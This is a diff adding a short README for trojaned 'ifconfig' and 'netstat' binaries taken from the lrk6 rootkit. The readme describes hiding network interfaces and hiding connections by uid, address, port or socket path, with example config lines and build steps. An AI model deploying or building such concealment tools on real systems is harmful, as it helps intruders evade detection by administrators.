@@ -1,0 +1,39 @@
+ifconfig trojano  by twiz - twiz@superdotati.net
+
+This ifconfig hides interfaces written in a extern file (defined in a char 
+array tifconfilez[] to "strings" hiding).
+For example put "sit0" if you want to hide sit0 ecc ecc :)
+To compile enter in "lib" directory and give "make", than come back in "ifconfig.c directory" and give make again...(this 'cause a lame error in Makefile).
+And then enjoy yourself :)
+
+            twiz
+
+thanks to : #cuneo, lgm members - dunric, colla, guybrush, acido, luna and the others, friends like nextime, kraz and to everyone who is crazy enough to "sparareunamareadicazzate" with me ;))
+
+netstat trojano - originally by vejeta, little modified by me :)
+
+From lrk6 :
+netstat -       Modified to remove tcp/udp/sockets from or to specified
+                addresses, uids and ports. 
+                type 0: hide uid
+                type 1: hide local address
+                type 2: hide remote address
+                type 3: hide local port
+                type 4: hide remote port
+                type 5: hide UNIX socket path
+
+                example:
+                0 500           <- Hides all connections by uid 500
+                1 128.31        <- Hides all local connections from 128.31.X.X
+                2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
+                3 8000          <- Hides all local connections from port 8000
+                4 6667          <- Hides all remote connections to port 6667
+                5 .term/socket  <- Hides all UNIX sockets including the path
+                                   .term/socket
+
+
+-> the config file is still in a char array in source code, change it if you 
+   want...
+
+bye 
+                 twiz - twiz@superdotati.net
